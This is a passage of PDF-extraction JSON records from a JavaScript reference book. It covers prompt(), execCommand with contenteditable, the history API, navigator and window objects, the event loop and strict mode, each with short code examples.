        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  name  =  prompt ( \"What's your name?\" ); console. log ( \"Hello, \"   +  name );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "You can also pass  prompt ()  a second parameter, which will be displayed as the default text in the prompt's text \ufb01eld.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  name  =  prompt ( 'What \\' s your name?' ,   ' Name...' ); console. log ( 'Hello, '   +  name );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Parameter Description",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "message Required. Text to display above the text \ufb01eld of the prompt. default Optional. Default text to display in the text \ufb01eld when the prompt is displayed.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 283",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 45: execCommand and contenteditable",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "commandId value \u22ee  Inline formatting commands   ",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "backColor Color value String bold   createLink URL String fontName Font family name fontSize \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\" foreColor Color value String strikeThrough   superscript   unlink  ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "\u22ee  Block formatting commands   ",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "delete   formatBlock \"address\", \"dd\", \"div\", \"dt\", \"h1\", \"h2\", \"h3\", \"h4\", \"h5\", \"h6\", \"p\", \"pre\" forwardDelete   insertHorizontalRule   insertHTML HTML String insertImage URL String insertLineBreak   insertOrderedList   insertParagraph   insertText Text string insertUnorderedList   justifyCenter   justifyFull   justifyLeft   justifyRight   outdent  ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "\u22ee  Clipboard commands   copy",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Currently Selected String cut Currently Selected String paste  ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "\u22ee  Miscellaneous commands  ",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "defaultParagraphSeparator   redo   selectAll   styleWithCSS   undo   useCSS  ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 284",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 45.1: Listening to Changes of contenteditable",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Events that work with most form elements (e.g.,  change ,  keydown ,  keyup ,  keypress ) do not work with",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "contenteditable .",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Instead, you can listen to changes of  contenteditable  contents with the  input  event. Assuming",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "contenteditableHtmlElement  is a JS DOM object that is  contenteditable : contenteditableHtmlElement. addEventListener ( \"input\" ,   function ()   {     console. log ( \"contenteditable element changed\" ); });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 45.2: Getting started",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The HTML attribute  contenteditable  provides a simple way to turn a HTML element into a user-editable area",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "<div  contenteditable > You can  <b> edit </b>  me! </div>",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Native Rich-Text editing",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Using  JavaScript  and  execCommand W3C  you can additionally pass more editing features to the currently focused contenteditable  element (speci\ufb01cally at the caret position or selection). The  execCommand  function method accepts 3 arguments",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "document. execCommand ( commandId ,  showUI ,  value )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "commandId  String. from the list of available ** commandId **s",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "(see:  Parameters \u2192 commandId )",
        "font_name": "OpenSans-BoldItalic",
        "font_size": 10,
        "img": []
    },
    {
        "text": "showUI  Boolean (not implemented. Use  false ) value  String If a command expects a command-related String  value , otherwise  \"\" .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "(see:  Parameters \u2192 value )",
        "font_name": "OpenSans-BoldItalic",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Example using the  \"bold\"   command  and  \"formatBlock\"  (where a  value  is expected):",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "document. execCommand ( \"bold\" ,   false ,   \"\" );            // Make selected text bold document. execCommand ( \"formatBlock\" ,   false ,   \"H2\" );   // Make selected text Block-level <h2>",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Quick Start Example:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "<button   data-edit = \"bold\" ><b> B </b></button> <button   data-edit = \"italic\" ><i> I </i></button>",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "<button   data-edit = \"formatBlock:p\" > P </button> <button   data-edit = \"formatBlock:H1\" > H1 </button> <button   data-edit = \"insertUnorderedList\" > UL </button> <button   data-edit = \"justifyLeft\" > &#8676; </button> <button   data-edit = \"justifyRight\" > &#8677; </button> <button   data-edit = \"removeFormat\" > &times; </button> <div  contenteditable ><p> Edit me! </p></div>",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "<script>",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "[].forEach.call(document.querySelectorAll(\"[data-edit]\"), function(btn) {   btn.addEventListener(\"click\", edit, false); });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 285",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function edit(event) {   event.preventDefault();   var cmd_val = this.dataset.edit.split(\":\");   document.execCommand(cmd_val[0], false, cmd_val[1]); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "<script>",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "jsFiddle demo Basic Rich-Text editor example (Modern browsers)",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Final thoughts",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Even being present for a long time (IE6), implementations and behaviors of  execCommand  vary from browser to browser making \"building a Fully-featured and cross-browser compatible WYSIWYG editor\" a hard task to any experienced JavaScript developer. Even if not yet fully standardized you can expect pretty decent results on the newer browsers like  Chrome, Firefox, Edge . If you need  better  support for other browsers and more features like HTMLTable editing etc. a rule of thumbs is to look for an  already existent  and robust  Rich-Text  editor.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 45.3: Copy to clipboard from textarea using execCommand(\"copy\")",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "<! DOCTYPE html > < html lang = \"en\" > < head >      < meta charset = \"UTF-8\" >      < title ></ title > </ head > < body >      < textarea id = \"content\" ></ textarea >      < input type = \"button\"  id = \"copyID\"  value = \"Copy\"   />      < script type = \"text/javascript\" >          var  button  =  document. getElementById ( \"copyID\" ),             input  =  document. getElementById ( \"content\" );         button. addEventListener ( \"click\" ,   function ( event )   {             event. preventDefault ();             input. select ();             document. execCommand ( \"copy\" );          });      </ script > </ body > </ html >",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "document. execCommand ( \"copy\" )  copies the current selection to the clipboard",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 45.4: Formatting",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Users can add formatting to  contenteditable  documents or elements using their browser's features, such as common keyboard shortcuts for formatting (  Ctrl-B   for  bold ,   Ctrl-I   for  italic , etc.) or by dragging and dropping images, links, or markup from the clipboard. Additionally, developers can use JavaScript to apply formatting to the current selection (highlighted text).",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "document. execCommand ( 'bold' ,   false ,   null );   // toggles bold formatting document. execCommand ( 'italic' ,   false ,   null );   // toggles italic formatting",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 286",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "document. execCommand ( 'underline' ,   false ,   null );   // toggles underline",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 287",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 46: History",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Parameter Details",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "domain The domain you want to update to title The title to update to path The path to update to",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 46.1: history.pushState()",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Syntax :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "history. pushState ( state object ,  title ,  url )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This method allows to ADD histories entries. For more reference, Please have a look on this document :  pushState() method",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Example :",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "window. history . pushState ( \"http://example.ca\" ,   \"Sample Title\" ,   \"/example/path.html\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This example inserts a new record into the history, address bar, and page title. Note this is di\ufb00erent from the  history. replaceState () . Which updates the current history entry, rather than adding a new one.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 46.2: history.replaceState()",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Syntax :",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "history. replaceState ( data ,  title  [,  url  ])",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This method modi\ufb01es the current history entry instead of creating a new one. Mainly used when we want to update URL of the current history entry.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "window. history . replaceState ( \"http://example.ca\" ,   \"Sample Title\" ,   \"/example/path.html\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This example replaces the current history, address bar, and page title. Note this is di\ufb00erent from the  history. pushState () . Which inserts a new history entry, rather than replacing the current one.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 46.3: Load a speci\ufb01c URL from the history list",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "go() method",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The go() method loads a speci\ufb01c URL from the history list. The parameter can either be a number which goes to the URL within the speci\ufb01c position (-1 goes back one page, 1 goes forward one page), or a string. The string must be a partial or full URL, and the function will go to the \ufb01rst URL that matches the string. Syntax",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 288",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "history. go ( number | URL )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Example Click on the button to go back two pages:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "<html>      <head>",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     <script   type = \"text/javascript\" >         function goBack()         {             window.history.go(-2)         }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     </script>      </head>",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     <body>               <input   type = \"button\"   value = \"Go back 2 pages\"   onclick = \"goBack()\"   />     ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     </body> </html>",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 289",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 47: Navigator Object",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 47.1: Get some basic browser data and return it as a JSON object",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The following function can be used to get some basic information about the current browser and return it in JSON format.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  getBrowserInfo ()   {      var         json  =   \"[{\" ,        ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         /* The array containing the browser info */",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "        info  =   [             navigator. userAgent ,   // Get the User-agent",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "            navigator. cookieEnabled ,   // Checks whether cookies are enabled in browser",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "            navigator. appName ,   // Get the Name of Browser             navigator. language ,    // Get the Language of Browser             navigator. appVersion ,    // Get the Version of Browser",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "            navigator. platform    // Get the platform for which browser is compiled",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         ],",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         /* The array containing the browser info names */",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "        infoNames  =   [                   \"userAgent\" ,                   \"cookiesEnabled\" ,                   \"browserName\" ,                   \"browserLang\" ,                   \"browserVersion\" ,                   \"browserPlatform\"          ];",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     /* Creating the JSON object */",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     for   ( var  i  =   0 ;  i  <  info. length ;  i ++)   {          if   ( i  ===  info. length   -   1 )   {             json  +=   '\"'   +  infoNames [ i ]   +   '\": \"'   +  info [ i ]   +   '\"' ;          }          else   {             json  +=   '\"'   +  infoNames [ i ]   +   '\": \"'   +  info [ i ]   +   '\",' ;          }      };      return  json  +   \"}]\" ; };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 290",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 48: BOM (Browser Object Model)",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 48.1: Introduction",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The BOM (Browser Object Model) contains objects that represent the current browser window and components; objects that model things like  history, device's screen,  etc The topmost object in BOM is the  window  object, which represents the current browser window or tab. Document:  represents current web page. History:  represents pages in browser history. Location:  represents URL of current page. Navigator:  represents information about browser. Screen:  represents device's display information.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": [
            "output_directory\\image_306_1.png"
        ]
    },
    {
        "text": "Section 48.2: Window Object Properties",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The Window Object contains the following properties.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Property Description",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "window.closed Whether the window has been closed",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 291",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "window.length Number of  <iframe>  elements in window window.name Gets or sets the name of the window window.innerHeight Height of window window.innerWidth Width of window window.screenX X-coordinate of pointer, relative to top left corner of screen window.screenY Y-coordinate of pointer, relative to top left corner of screen window.location Current URL of window object (or local \ufb01le path) window.history Reference to history object for browser window or tab. window.screen Reference to screen object window.pageXO\ufb00set Distance document has been scrolled horizontally window.pageYO\ufb00set Distance document has been scrolled vertically",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 48.3: Window Object Methods",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The most important object in the  Browser Object Model  is the window object. It helps in accessing information about the browser and its components. To access these features, it has various methods and properties.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Method Description",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "window.alert() Creates dialog box with message and an OK button window.blur() Remove focus from window window.close() Closes a browser window window.con\ufb01rm() Creates dialog box with message, an OK button and a cancel button window.getComputedStyle() Get CSS styles applied to an element window.moveTo(x,y) Move a window's left and top edge to supplied coordinates window.open() Opens new browser window with URL speci\ufb01ed as parameter window.print() Tells browser that user wants to print contents of current page window.prompt() Creates dialog box for retrieving user input window.scrollBy() Scrolls the document by the speci\ufb01ed number of pixels window.scrollTo() Scrolls the document to the speci\ufb01ed coordinates window.setInterval() Do something repeatedly at speci\ufb01ed intervals window.setTimeout() Do something after a speci\ufb01ed amount of time window.stop() Stop window from loading",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 292",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 49: The Event Loop",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 49.1: The event loop in a web browser",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The vast majority of modern JavaScript environments work according to an  event loop . This is a common concept in computer programming which essentially means that your program continually waits for new things to happen, and when they do, reacts to them. The  host environment  calls into your program, spawning a \"turn\" or \"tick\" or \"task\" in the event loop, which then  runs to completion . When that turn has \ufb01nished, the host environment waits for something else to happen, before all this starts. A simple example of this is in the browser. Consider the following example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "<!DOCTYPE html> <title> Event loop example </title>",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "<script>",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console.log(\"this a script entry point\"); document.body.onclick = () => {   console.log(\"onclick\"); }; setTimeout(() => {   console.log(\"setTimeout callback log 1\");   console.log(\"setTimeout callback log 2\"); }, 100);",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "</script>",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In this example, the host environment is the web browser. The HTML parser will \ufb01rst execute the  <script> . It will run to completion. 1. The call to  setTimeout  tells the browser that, after 100 milliseconds, it should enqueue a  task  to perform the 2. given action. In the meantime, the event loop is then responsible for continually checking if there's something else to do: 3. for example, rendering the web page. After 100 milliseconds, if the event loop is not busy for some other reason, it will see the task that 4. setTimeout  enqueues, and run the function, logging those two statements. At any time, if someone clicks on the body, the browser will post a task to the event loop to run the click 5. handler function. The event loop, as it goes around continually checking what to do, will see this, and run that function. You can see how in this example there are several di\ufb00erent types of entry points into JavaScript code, which the event loop invokes: The  <script>  element is invoked immediately The  setTimeout  task is posted to the event loop and run once The click handler task can be posted many times and run each time Each turn of the event loop is responsible for many things; only some of them will invoke these JavaScript tasks. For full details,  see the HTML speci\ufb01cation One last thing: what do we mean by saying that each event loop task \"runs to completion\"? We mean that it is not generally possible to interrupt a block of code that is queued to run as a task, and it is never possible to run code interleaved with another block of code. For example, even if you clicked at the perfect time, you could never get the",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 293",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "above code to log  \"onclick\"  in between the two  setTimeout callback log  1 / 2 \" s. This is due to the way the task- posting works; it is cooperative and queue-based, instead of preemptive.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 49.2: Asynchronous operations and the event loop",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Many interesting operations in common JavaScript programming environments are asynchronous. For example, in the browser we see things like",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "window. setTimeout (()   =>   {   console. log ( \"this happens later\" ); },   100 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "and in Node.js we see things like",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "fs. readFile ( \"file.txt\" ,   ( err ,  data )   =>   {   console. log ( \"data\" ); });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "How does this \ufb01t with the event loop? How this works is that when these statements execute, they tell the  host environment  (i.e., the browser or Node.js runtime, respectively) to go o\ufb00 and do something, probably in another thread. When the host environment is done doing that thing (respectively, waiting 100 milliseconds or reading the \ufb01le  file. txt ) it will post a task to the event loop, saying \"call the callback I was given earlier with these arguments\". The event loop is then busy doing its thing: rendering the webpage, listening for user input, and continually looking for posted tasks. When it sees these posted tasks to call the callbacks, it will call back into JavaScript. That's how you get asynchronous behavior!",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 294",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 50: Strict mode",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 50.1: For entire scripts",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Strict mode can be applied on entire scripts by placing the statement  \"use strict\" ;  before any other statements.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "\"use strict\" ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// strict mode now applies for the rest of the script",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Strict mode is only enabled in scripts where you de\ufb01ne  \"use strict\" . You can combine scripts with and without strict mode, because the strict state is not shared among di\ufb00erent scripts.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "Note:  All code written inside ES2015+ modules and classes are strict by default.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 50.2: For functions",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Strict mode can also be applied to single functions by prepending the  \"use strict\" ;  statement at the beginning of the function declaration.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  strict ()   {     \"use strict\" ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    // strict mode now applies to the rest of this function",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    var  innerFunction  =   function   ()   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "      // strict mode also applies here",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    }; } function  notStrict ()   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   // but not here }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Strict mode will also apply to any inner scoped functions.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 50.3: Changes to properties",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Strict mode also prevents you from deleting undeletable properties.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "\"use strict\" ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "delete  Object. prototype ;   // throws a TypeError",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The above statement would simply be ignored if you don't use strict mode, however now you know why it does not execute as expected. It also prevents you from extending a non-extensible property.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  myObject  =   { name :   \"My Name\" } Object. preventExtensions ( myObject ); function  setAge ()   {     myObject. age   =   25 ;     // No errors } function  setAge ()   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 295",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "     \"use strict\" ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    myObject. age   =   25 ;    // TypeError: can't define property \"age\": Object is not extensible }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 50.4: Changes to global properties",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "In a non-strict-mode scope, when a variable is assigned without being initialized with the  var ,  const  or the  let keyword, it is automatically declared in the global scope:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "a  =   12 ; console. log ( a );   // 12",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In strict mode however, any access to an undeclared variable will throw a reference error:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "\"use strict\" ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "a  =   12 ;   // ReferenceError: a is not defined",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( a );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This is useful because JavaScript has a number of possible events that are sometimes unexpected. In non-strict- mode, these events often lead developers to believe they are bugs or unexpected behavior, thus by enabling strict- mode, any errors that are thrown enforces them to know exactly what is being done.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "\"use strict\" ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "                        // Assuming a global variable mistypedVariable exists mistypedVaraible  =   17 ;   // this line throws a ReferenceError due to the                         // misspelling of variable",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This code in strict mode displays one possible scenario: it throws a reference error which points to the assignment's line number, allowing the developer to immediately detect the mistype in the variable's name. In non-strict-mode, besides the fact that no error is thrown and the assignment is successfully made, the mistypedVaraible  will be automatically declared in the global scope as a global variable. This implies that the developer needs to look up manually this speci\ufb01c assignment in the code. Furthermore, by forcing declaration of variables, the developer cannot accidentally declare global variables inside functions. In non-strict-mode:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  foo ()   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   a  =   \"bar\" ;   // variable is automatically declared in the global scope }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "foo (); console. log ( a );   // >> bar",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In strict mode, it is necessary to explicitly declare the variable:",
